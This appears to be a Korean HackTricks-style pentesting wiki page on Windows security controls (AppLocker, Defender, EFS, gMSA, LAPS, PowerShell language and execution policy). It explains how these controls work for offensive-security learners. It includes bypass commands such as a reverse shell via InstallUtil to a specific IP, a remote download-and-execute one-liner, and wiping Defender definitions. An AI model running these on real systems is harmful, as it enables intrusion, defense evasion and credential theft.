# Windows 보안 제어

{{#include ../banners/hacktricks-training.md}}

## AppLocker 정책

애플리케이션 허용 목록은 시스템에 존재하고 실행이 허용된 승인 소프트웨어 애플리케이션 또는 실행 파일의 목록입니다. 조직의 특정 비즈니스 요구에 부합하지 않는 유해한 malware와 승인되지 않은 소프트웨어로부터 환경을 보호하는 것이 목적입니다.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker)는 Microsoft의 **애플리케이션 허용 목록 솔루션**으로, 시스템 관리자가 **사용자가 실행할 수 있는 애플리케이션과 파일을 제어**할 수 있게 해 줍니다. 실행 파일, 스크립트, Windows 설치 프로그램 파일, DLL, 패키지 앱 및 패키지 앱 설치 프로그램을 **세밀하게 제어**할 수 있습니다.\
조직에서는 **cmd.exe와 PowerShell.exe를 차단**하고 특정 디렉터리에 대한 쓰기 권한을 제한하는 경우가 많지만, **이 모든 제한은 우회할 수 있습니다**.

### 확인

차단 목록/허용 목록에 있는 파일 및 확장자를 확인합니다:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy`는 특정 ID의 후보 파일을 AppLocker 정책에 따라 평가합니다. 규칙이 사용자나 그룹을 대상으로 할 수 있으므로 페이로드를 실행할 토큰을 가진 계정을 테스트하세요. 규칙이 일치할 수 있는 경로, 해시, 게시자 메타데이터를 확인하는 데는 `Get-AppLockerFileInformation`도 유용합니다.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

거부된 테스트 결과를 실제 차단으로 간주하기 전에 해당 규칙 컬렉션의 **실효 적용 모드와 Application Identity 서비스**를 확인하세요. `AuditOnly`는 규칙을 평가하지만 실행은 허용하며, 해당 컬렉션에 규칙이 있는 경우 `NotConfigured`는 비활성화와 같은 의미가 아닙니다.<sup>[[7]](#references)</sup> `AppIDSvc`가 중지되어 있으면 AppLocker가 적용되지 않습니다.<sup>[[9]](#references)</sup> 이러한 점검을 통해 실제 우회와 파일을 애초에 차단하지 않은 정책을 구분할 수 있습니다.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

통제된 실행 테스트에서는 AppLocker 이벤트 로그를 확인하세요. **8003/8006**은 audit mode에서 EXE/DLL 또는 script/MSI가 차단되었을 것임을 의미하고, **8004/8007**은 실제로 차단되었음을 의미합니다. 의도한 실행 경로와 동일한 파일 형식 및 사용자 ID로 테스트하세요.<sup>[[8]](#references)</sup>

이 레지스트리 경로에는 AppLocker가 적용한 구성과 정책이 포함되어 있어, 시스템에 현재 적용 중인 규칙을 검토할 수 있습니다.

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy를 우회하는 데 유용한 **쓰기 가능한 폴더**: AppLocker가 `C:\Windows\System32` 또는 `C:\Windows` 내의 모든 항목 실행을 허용하는 경우, 이를 **우회하는 데** 사용할 수 있는 **쓰기 가능한 폴더**가 있습니다.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- 일반적으로 **신뢰되는** [**"LOLBAS's"**](https://lolbas-project.github.io/) 바이너리도 AppLocker를 우회하는 데 유용할 수 있습니다.
- **잘못 작성된 규칙도 우회할 수 있습니다**
  - 예를 들어 **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**의 경우, 어디든 **`allowed`라는 폴더를 만들면** 허용됩니다.
  - 조직은 **`%System32%\WindowsPowerShell\v1.0\powershell.exe` 실행 파일을 차단하는 데** 주력하는 경우가 많지만, `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` 또는 `PowerShell_ISE.exe`와 같은 **다른** [**PowerShell 실행 파일 위치**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)를 간과합니다.
- **DLL enforcement는** 시스템에 추가 부하를 줄 수 있고 문제를 방지하기 위해 많은 테스트가 필요하므로 거의 활성화되지 않습니다. 따라서 **DLL을 backdoor로 사용하면 AppLocker를 우회하는 데 도움이 됩니다**.
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하면 어떤 프로세스에서든 **Powershell** 코드를 **실행**하고 AppLocker를 우회할 수 있습니다. 자세한 내용은 다음을 확인하세요: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

로컬 credentials는 이 파일에 있으며, 비밀번호는 해시 처리되어 있습니다.

### Local Security Authority (LSA) - LSASS

Single Sign-On을 위해 이 하위 시스템의 **메모리**에 **credentials**(해시 처리됨)가 **저장됩니다**.\
**LSA**는 로컬 **security policy**(비밀번호 정책, 사용자 권한 등), **authentication**, **access tokens** 등을 관리합니다.\
로컬 로그인에서는 **SAM** 파일에서 제공된 credentials를 **확인**하고, 도메인 사용자 인증을 위해 **domain controller**와 **통신**하는 역할을 LSA가 담당합니다.

**credentials**는 **LSASS 프로세스**에 **저장됩니다**: Kerberos 티켓, NT 및 LM 해시, 쉽게 복호화할 수 있는 비밀번호.

### LSA secrets

LSA는 일부 credentials를 디스크에 저장할 수 있습니다:

- Active Directory 컴퓨터 계정의 비밀번호 (domain controller에 연결할 수 없는 경우).
- Windows 서비스 계정의 비밀번호
- 예약된 작업의 비밀번호
- 기타 (IIS 애플리케이션의 비밀번호 등)

### NTDS.dit

Active Directory의 데이터베이스입니다. Domain Controller에만 존재합니다.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)는 Windows 10 및 Windows 11과 일부 Windows Server 버전에서 사용할 수 있는 Antivirus입니다. **`WinPEAS`**와 같은 일반적인 pentesting 도구를 **차단**합니다. 하지만 이러한 **보호를 우회하는 방법**이 있습니다.

### Check

Defender의 **상태**를 확인하려면 PS cmdlet **`Get-MpComputerStatus`**를 실행하면 됩니다(**`RealTimeProtectionEnabled`** 값을 확인하여 활성화 여부를 알아보세요):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

열거하려면 다음 명령도 실행할 수 있습니다:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## 암호화 파일 시스템 (EFS)

EFS는 **File Encryption Key (FEK)**라는 **대칭 키**를 사용해 파일을 암호화하여 보호합니다. 이 키는 사용자의 **공개 키**로 암호화되어 파일의 NTFS `$EFS` 메타데이터(`$LOGGED_UTILITY_STREAM`)에 저장되며, 일반적인 `$DATA` 대체 데이터 스트림에는 저장되지 않습니다.<sup>[[10]](#references)</sup> 복호화할 때는 사용자의 디지털 인증서에 해당하는 **개인 키**로 FEK를 풀어냅니다. 구성된 데이터 복구 에이전트(DRA)는 데이터 복구 필드에 FEK의 별도 암호화 사본을 보유합니다.<sup>[[13]](#references)</sup>

**사용자 개입 없이 복호화되는 경우**는 다음과 같습니다.

- 파일이나 폴더를 [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)와 같은 비 EFS 파일 시스템으로 이동하면 자동으로 복호화됩니다.
- SMB/CIFS 프로토콜을 통해 네트워크로 전송되는 암호화된 파일은 전송 전에 복호화됩니다.

이 암호화 방식에서는 소유자가 암호화된 파일에 **투명하게 접근**할 수 있습니다. 하지만 소유자의 암호만 변경한 뒤 로그인해도 복호화할 수는 없습니다.

**핵심 요점**:

- EFS는 사용자의 공개 키로 암호화된 대칭 FEK를 사용합니다.
- 복호화에는 FEK에 접근하기 위한 사용자의 개인 키가 필요합니다.
- FAT32로 복사하거나 네트워크로 전송하는 등의 특정 조건에서 자동으로 복호화됩니다.
- 소유자는 추가 절차 없이 암호화된 파일에 접근할 수 있습니다.

### EFS 정보 확인

`%APPDATA%\Microsoft\Protect`의 내용만으로 EFS 사용 여부를 추정하지 마세요. 이 경로에는 여러 Windows 기능에서 사용하는 DPAPI 마스터 키가 저장됩니다.<sup>[[19]](#references)</sup> 대신 `cipher /c "C:\path\file"`을 사용해 암호화된 파일을 검사하고 해당 파일의 사용자 및 복구 인증서를 확인하세요. `cipher /e`와 `cipher /d`는 일치하는 개인 키를 가진 보안 주체의 파일을 암호화하고 복호화합니다.<sup>[[11]](#references)</sup>

### EFS 파일 복호화

`cipher /c`에 복구 인증서가 표시되고 해당 인증서와 일치하는 **DRA 개인 키**가 포함된 PFX 파일이 있다면, 해당 PFX 파일을 현재 사용자의 인증서 저장소로 가져온 다음 파일을 복호화하세요.<sup>[[11]](#references)[[12]](#references)</sup> 새로 생성한 DRA 인증서로는 이전 파일을 복호화할 수 없습니다. 파일을 암호화할 때 해당 인증서의 공개 키가 이미 포함되어 있어야 합니다. NTFS ACL 접근 권한이나 계정 암호 재설정만으로는 필요한 개인 키를 얻을 수 없습니다.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### 권한 있는 시스템으로 동작하기

이 방법을 사용하려면 **피해 사용자**가 호스트에서 **프로세스**를 **실행 중**이어야 합니다. 그런 경우 `meterpreter` 세션에서 사용자의 프로세스 토큰을 가장할 수 있습니다(`incognito`의 `impersonate_token`). 또는 사용자의 프로세스로 `migrate`할 수도 있습니다.

#### 사용자의 비밀번호를 알고 있는 경우

Mimikatz는 사용자의 인증서와 개인 키를 가져온 다음 이를 사용해 EFS로 보호된 파일을 복호화할 수 있습니다.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## 그룹 관리 서비스 계정(gMSA)

Microsoft는 IT 인프라에서 서비스 계정 관리를 간소화하기 위해 **그룹 관리 서비스 계정(gMSA)**을 개발했습니다. "**암호 사용 기간 제한 없음**" 설정이 활성화된 경우가 많은 기존 서비스 계정과 달리, gMSA는 더 안전하고 관리하기 쉬운 솔루션을 제공합니다.

- **자동 암호 관리**: gMSA는 일반적으로 30일마다 교체되는 복잡한 240바이트 암호를 사용합니다. 도메인 컨트롤러는 KDS 키 자료를 사용해 암호를 생성하므로 수동으로 암호를 업데이트할 필요가 없습니다.<sup>[[16]](#references)[[20]](#references)</sup>
- **강화된 보안**: 이 계정은 잠금 상태가 되지 않으며 대화형 로그인에 사용할 수 없어 보안이 강화됩니다.
- **다중 호스트 지원**: gMSA는 여러 호스트에서 공유할 수 있으므로 여러 서버에서 실행되는 서비스에 적합합니다.
- **예약된 작업 지원**: 관리 서비스 계정과 달리 gMSA는 예약된 작업 실행을 지원합니다.
- **간소화된 SPN 관리**: 컴퓨터의 sAMaccount 세부 정보나 DNS 이름이 변경되면 시스템이 서비스 사용자 이름(SPN)을 자동으로 업데이트해 SPN 관리를 간소화합니다.

도메인 컨트롤러는 읽기 요청이 있을 때 KDS에서 파생된 암호 자료를 사용해 LDAP 속성 _**msDS-ManagedPassword**_를 구성합니다. 이 값은 별도로 저장된 암호가 아닙니다. 일반적으로 30일마다 변경됩니다.<sup>[[20]](#references)</sup> 반환되는 [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)은 **암호화된 암호가 아닙니다**. 해당 블롭의 `CurrentPassword` 필드에는 평문 암호가 들어 있습니다.<sup>[[14]](#references)</sup> 접근 권한은 `msDS-GroupMSAMembership`을 기준으로 확인되므로, 관리자나 서비스 호스트뿐 아니라 암호 가져오기 권한을 부여받은 모든 주체가 대상에 포함됩니다.<sup>[[15]](#references)</sup> LDAP 연결에는 LDAPS 또는 SASL sealing과 같은 기밀성 보호가 적용되어야 합니다.<sup>[[20]](#references)</sup>

KDS 루트 키가 노출된 후 오프라인으로 암호를 파생하는 방법은 [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md)를 참조하세요.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**를 사용해 이 암호를 읽을 수 있습니다:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**이 게시물에서 자세한 내용 확인하기**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

또한 **gMSA**의 **비밀번호**를 **읽기** 위해 **NTLM relay attack**을 수행하는 방법은 이 [웹 페이지](https://cube0x0.github.io/Relaying-for-gMSA/)를 확인하세요.<sup>[[3]](#references)</sup>

## LAPS

열거 과정에서 **legacy Microsoft LAPS**와 기본 제공되는 **Windows LAPS** 구현을 구분하세요. Windows LAPS는 2023년 4월 11일 Windows 업데이트와 함께 출시되었으며, 관리 대상 로컬 관리자 비밀번호를 **Windows Server Active Directory** 또는 **Microsoft Entra ID**에 백업할 수 있습니다. AD를 사용하는 배포 환경에서는 비밀번호를 추가로 암호화하고, 암호화된 비밀번호 기록을 보관하며, 도메인 컨트롤러의 DSRM 비밀번호를 관리할 수 있습니다. 다운로드 가능한 legacy MSI는 최신 Windows 버전에서 더 이상 사용되지 않지만, Windows LAPS는 legacy 에뮬레이션 모드로 작동할 수 있습니다.<sup>[[6]](#references)</sup>

legacy Microsoft LAPS와 Windows LAPS는 별개의 구현이므로, 속성 또는 cmdlet별 공격을 적용하기 전에 어느 구현이 배포되어 있는지 파악하세요. 링크된 페이지에서는 검색, ACL 열거, 검색, 만료 기간 조작, 오프라인 복구를 다루므로 여기서는 해당 절차를 반복하지 않습니다.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS 제한된 언어 모드

PowerShell [**제한된 언어 모드**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)는 COM 객체 차단, 승인된 .NET 형식만 허용, XAML 기반 워크플로 및 PowerShell 클래스 차단 등 PowerShell을 효과적으로 사용하는 데 필요한 여러 기능을 **제한합니다**.

### **확인**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2`는 선택적 PowerShell 2 엔진이 설치된 호스트에서만 사용할 수 있었던 레거시 다운그레이드 방식입니다. 업데이트된 Windows 11 24H2 또는 Windows Server 2025에는 더 이상 포함되지 않으므로, 현재 사용 가능한 CLM bypass로 간주하지 마세요.<sup>[[17]](#references)</sup> 애플리케이션 제어가 적용되면 PowerShell은 신뢰할 수 없는 코드를 Constrained Language에서 실행하고, 정책에서 신뢰하는 스크립트는 Full Language에서 실행할 수 있습니다.<sup>[[18]](#references)</sup>

이전 구성에서는 [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)을 사용할 수 있습니다.\
**컴파일하려면** **_참조 추가_** -> _찾아보기_ ->_찾아보기_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll`을 추가하고 **프로젝트를 .Net4.5로 변경해야 할 수 있습니다**.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) 또는 [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)을 사용하면 모든 프로세스에서 **Powershell** 코드를 **실행**하고 제한 모드를 우회할 수 있습니다. 자세한 내용은 [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)를 확인하세요.<sup>[[1]](#references)</sup>

## PS 실행 정책

기본적으로 **restricted**로 설정되어 있습니다. 이 정책을 우회하는 주요 방법은 다음과 같습니다.<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

자세한 내용은 [여기](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)에서 확인할 수 있습니다<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

사용자 인증에 사용할 수 있는 API입니다.

SSPI는 통신하려는 두 컴퓨터에 적합한 프로토콜을 찾습니다. 선호되는 방식은 Kerberos입니다. 그런 다음 SSPI가 사용할 인증 프로토콜을 협상합니다. 이러한 인증 프로토콜은 Security Support Provider(SSP)라고 하며, 각 Windows 컴퓨터에 DLL 형태로 존재합니다. 통신하려면 두 컴퓨터가 같은 SSP를 지원해야 합니다.

### 주요 SSP

- **Kerberos**: 선호되는 프로토콜
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** 및 **NTLMv2**: 호환성을 위한 프로토콜
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: 웹 서버 및 LDAP에서 사용되며, 비밀번호는 MD5 해시 형태로 전송됩니다
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL 및 TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 사용할 프로토콜을 협상하는 데 사용됩니다(Kerberos 또는 NTLM 중 선택하며, 기본값은 Kerberos입니다)
  - %windir%\Windows\System32\lsasrv.dll

#### 협상 과정에서는 여러 방법 또는 한 가지 방법만 제안될 수 있습니다.

## UAC - User Account Control

[사용자 계정 컨트롤(UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)은 **권한 상승이 필요한 작업에 대해 동의 메시지를 표시하는** 기능입니다.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [AppLocker 및 PowerShell 제한 언어 모드 우회하기](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [방법 ~ EFS 파일 복호화](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA를 위한 릴레이](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell 실행 정책을 우회하는 15가지 방법](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [AppLocker Windows PowerShell cmdlet 사용하기](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Windows LAPS 개요](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [AppLocker 규칙 작업하기](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [AppLocker에서 이벤트 뷰어 사용하기](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [AppLocker 프로세스 및 상호 작용](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [파일 스트림(로컬 파일 시스템)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Cipher 명령](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Certutil 명령](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [복구 에이전트 EFS 개인 키 백업하기](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [ms-DS-GroupMSAMembership 특성](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [그룹 관리 서비스 계정 보호하기](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Windows 클라이언트에서 제거된 기능](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [App Control을 사용해 PowerShell 보호하기](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [이벤트 4693 및 DPAPI 마스터 키](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [msDS-ManagedPassword 구성](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
